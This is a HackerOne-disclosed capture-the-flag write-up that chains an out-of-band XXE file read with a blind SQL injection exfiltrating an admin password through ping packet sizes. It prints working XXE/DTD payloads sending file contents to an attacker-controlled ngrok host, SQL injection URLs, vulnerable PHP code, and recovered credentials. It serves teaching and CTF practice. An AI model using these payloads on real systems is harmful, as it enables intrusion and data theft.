---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/out-of-bounds-read
  - env/web
substate: "resolved"
weakness: "Out-of-bounds Read"
enriched: true
body: true
date: 2021-06-18
submitted: 2021-06-04T17:42:52.280Z
bounty_usd: null
votes: 13
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "akshansh"
source: "https://hackerone.com/reports/1217702"
title: "Adam and the  Deadly  Injections"
---
# Adam and the  Deadly  Injections

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 13 | **Program:** h1-ctf | **Disclosed:** 2021-06-18

- Report: [https://hackerone.com/reports/1217702](https://hackerone.com/reports/1217702)
- CWE: Out-of-bounds Read
- Submitted: 2021-06-04T17:42:52.280Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi team adding the  flag here 
```
███
```

████

I will do the writeup in the below comments before the deadline itself
Thanks 
Akshansh

## Impact

....

## Timeline

- **Report Filed**
- **Report Triaged**
- **2021-06-05** @akshansh: # Summary:
The CTF was divided in two half where Adam divided his evil injections in two variants 
1. File Read via XXE OOB  
2. SQL Injection Data Exfil via Ping



# File Read via XXE OOB
## Summary Video

{F1327202}

The CTF began with scope https://ccc.h1ctf.com/  on the website there was log in and register functionalities but these functionalities didnt looked directly looked exploitable,Upon register we will get our hash for profile
https://ccc.h1ctf.com/u/s2goip  {s2goip}  was hash which was not looking exploitable directly
on the webiste itself there was mention of CCC designs twitter handle on the Twitter handle there was one screenshot https://twitter.com/DesignsCcc/status/1398629597298806786/photo/1
in which the second tab showed the path of error_-_-_log.t after trying among extensions we got txt extension was the right one thereby full link was ```https://ccc.h1ctf.com/error_-_-_log.txt```

{F1327225}


All of the above log files had rabbit holes and no clue to move forward until one thing in common they had h1- as prefix and bucket names example as https://h1-{hash}.s3.eu-west-2.amazonaws.com/files.xml    also remember the hash in beginning of profile creation we got length was same 6 digit this was matching as a pattern for  path prefix hash as in once we log we see as https://ccc.h1ctf.com/u/{hash} so here this hash will internally call for https://h1-{hash}.s3.eu-west-2.amazonaws.com/files.xml and query the given files.xml XML so on the account we made we had   https://ccc.h1ctf.com/u/name  so we need to create an s3 bucket with name h1-name for region eu-west-2.


Upon making creating the bucket I added a simple pingback XML file which confirmed the presence of XXE injection 

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE testping [<!ENTITY xxe SYSTEM "http://controlledserver.com"> ] >
<testping>
	<r>&xxe;</r>
<testping>
```


Now we need to exfil local files out so, therefore, we would need a DTD file where we can reference in local files to call for this I used ngrok to create a public URL and  python httpserver to point to ngrok
Initially, i tried with few XXE payloads to read file but they were not working seemed like filter or restriction to overcome that i tried that PHP encode base64  filter and made a payload as

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://something.ngrok.io/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

Hosted Locally
dtd.xml

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://something.ngrok.io/dtd.xml?%data;'>">

```

Now upon loading the profile on my server i could see logs of base64 encoded of etc/passwd now we can query for files in system , on CCC designs in their tweet they mentioned 

```
Does anyone know if in nginx you can link a directory to a proxy_pass
```
Therefore it meant maybe they are running more server on some paths to know this we would need to query /etc/nginx/sites-enabled/default  as we change our DTD file with this path we get the file where we can see as below

{F1327226}


```
#server {
#    server_name ccc.h1ctf.com;
#    root /var/www/app/public;
#    index index.php;
#    location / {
#            try_files $uri $uri/ /index.php?$query_string;
#    }
#     location /2b5d2b11513d2c9b {
#       proxy_pass http://127.0.0.1:8888;
#     }
#
#    location ~ \.php$ {
#            include snippets/fastcgi-php.conf;
#            fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
#    }
#    listen 443 ssl;
#    ssl_certificate /etc/letsencrypt/live/ccc.h1ctf.com/fullchain.pem;
#    ssl_certificate_key /etc/letsencrypt/live/ccc.h1ctf.com/privkey.pem;
#    include /etc/letsencrypt/options-ssl-nginx.conf;
#    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;
#}

```

Here we can see /2b5d2b11513d2c9b which begins our final destination https://ccc.h1ctf.com/2b5d2b11513d2c9b to hit nail in coffin but adam evilness is yet to come.



# SQL Injection Data Exfil via Ping
## Summary Video:

█████████

Upon doing a dirsearch on this path i got https://ccc.h1ctf.com/2b5d2b11513d2c9b/.git/config file which referenced to https://github.com/ccc-labs/pinger/ where we had full source code to pinger server 

{F1327230}

Upon analyzing the source code we can see inside there is a reference call to 
/api/ping?id=  which is used by Controller\Pinger::ping()  function which first checks one IP can call function send($_GET["id"]) only one time in one minute. Now the send send function as we see below is vulnerabnle to SQL injection coz its appending user input id on line 5and not using parameterized query. 



```
class Ping
{

    public static function send( $id ){
        $sql = 'select * from host where id = '.$id.' LIMIT 1 ';
        $d = Db::connect()->prepare($sql);
        $d->execute();
        //Confirm we've found a matching row in the database
        if( $d->rowCount() == 1 ){
            $host = $d->fetch();
            $ip = $host["ip"];
            $packet_size = intval($host["packet_size"]);
            //make sure PING packet size between 1 and 65527
            if( $packet_size > 0 && $packet_size < 65528 ) {
                //check IP is a valid IPv4 Address
                if (filter_var($ip, FILTER_VALIDATE_IP,FILTER_FLAG_IPV4)) {
                    //SEND 4 PING PACKETS IN THE BACKGROUND
                    shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');
                }
            }
        }
    }

}

```
So seeing the file db.sql we can see that for the database for our use case we have 
host table with columns (`id`, `ip`, `packet_size`)  and user table with columns (`id`, `username`, `password`) 

shell_exec('ping -s '.$packet_size.' -c 4 '.$ip.'  > /dev/null &');

Here the IP and packet size fetched from the SQL statement is passed to ping command so because of SQL Injection we can now also ping our IP
as https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=999+union+all+select+1,'0.0.0.0',32--+-
where instead of 0.0.0.0 we add our IP and we can see pingback. To confirm injection and pingback we need a listener this can be enabled on VPS by adding network setting to listen for ICMP ,i have used tcpdump on my host machine


But problem and pain start here again first is we cannot see a direct response from SQL injection as the ping function will send us packet size and IP details only and the second problem is we can hit requests with one IP only once per minute.


To exfiltrate data and avoid WAF we can use UNION query and since we can send packet size as output from SQL query which we can recieve inspecting ping packets.  So now our mission statement is to exfil password from user table as we saw in Readme user is admin but the password was changed but problem is we dont know password length and it can be exfilled as numerical value only so what here we can do is get byte value in numerical sense and later convert it to ASCII value. also a point to note headers will add to +8 of actual value so we need to subtract that

For the above the query to fetch password from user table the query  will look like 

```
https://ccc.h1ctf.com/2b5d2b11513d2c9b/api/ping?id=12+union+all+select+1,'23.99.114.248',ASCII(SUBSTRING(password,1,1))+FROM+`user`+LIMIT+1--+-
```

here with each request we will recieve one character of password thereby adding ASCII(SUBSTRING(password,2,1)) => ASCII(SUBSTRING(password,3,1)) and so on to retrive full length of password. 
I'm really lazy person so here i used burp extension IP-rotate with an intruder to query for all characters i tried from 1 to 30 and as result, i got 21 different packet size responses

{F1327233}

but these were ASCII +8 character values so i needed to substract -8 from each of them so it finally became 

So on listener logs I did simple grep+substract as in video also

55 64 37 39 5E 31 48 48 4A 24 57 2A 49 4F 62 61 4B 64 51 67 49
which translates to Ud79^1HHJ$W*IObaKdQgI

thereby now we can log in to 
with 
```
username: admin
password: Ud79^1HHJ$W*IObaKdQgI
```

upon login, we can see our flag

██████████
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
